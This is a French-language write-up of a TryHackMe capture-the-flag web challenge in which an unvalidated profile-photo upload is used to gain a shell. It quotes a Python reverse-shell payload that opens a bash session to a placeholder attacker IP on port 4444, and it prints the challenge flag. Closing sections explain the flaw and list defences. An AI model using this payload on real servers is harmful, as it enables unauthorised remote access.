---
tags:
  - Chall
  - TryHackMe
  - LoveAtFirstBreach
  - web
  - reverse_shell
---
## Énoncé
>My Dearest Hacker,
>
>Days before Valentine's Day, TryHeartMe rushed out a new messaging platform called "Speed Chatter", promising instant connections and private conversations. But in the race to beat the holiday deadline, security took a back seat. Rumours are circulating that "Speed Chatter" was pushed to production without proper testing.
>
>As a security researcher, it's your task to break into "Speed Chatter", uncover flaws, and expose TryHeartMe's negligence before the damage becomes irreversible.
## Retex
Cette fois-ci on doit analyser un site de "chat room".
![[SC_HP.png|500]]
On voit qu'on peut envoyer des messages et upload une photo de profil.
D'après l'énoncé, les devs ont été pressés et la plateforme n'a pas été proprement testé. Étant donné que la plateforme est centralisée sur la sécurisation de la privatisation des messages, ils n'ont peut-être pas passé beaucoup de temps sur la gestion de l'upload des photos de profil.

Personnellement, je pense qu'un reverse shell peut passer ici :
```python
import os
os.system("bash -c 'bash -i >& /dev/tcp/Adresse_IP/4444 0>&1'")
```
En envoyant un script python à la place d'une photo, le site ne bronche pas.
![[Speed Chatting_reverse2.png|500]]
Mais grâce au script, toutes les commandes que je note dans mon terminal se font aussi du côté serveur, j'ai donc un reverse shell. En affichant les fichiers disponibles, je peux voir le flag.txt qui contient : **==THM{R3v3rs3_Sh3ll_L0v3_C0nn3ct10ns}==**

---
## Explication de la faille
Le site ne vérifie pas les types de fichiers uploader pour la photo de profil, on peut donc envoyer n'importe quoi et même obtenir un reverse shell.
## Pour s'en protéger
- *Valider les uploads :* N'accepter que les fichiers que l'on veut (ex : png, jpeg, etc)
- *Check fichiers uploads :* Vérifier chaque fichier upload avant d'en faire quoi que ce soit, via un antivirus comme clamscan 
- *Pas d'executable :* Ne pas exécuter automatiquement ces fichiers avant d'avoir checker si malveillant ou pas.
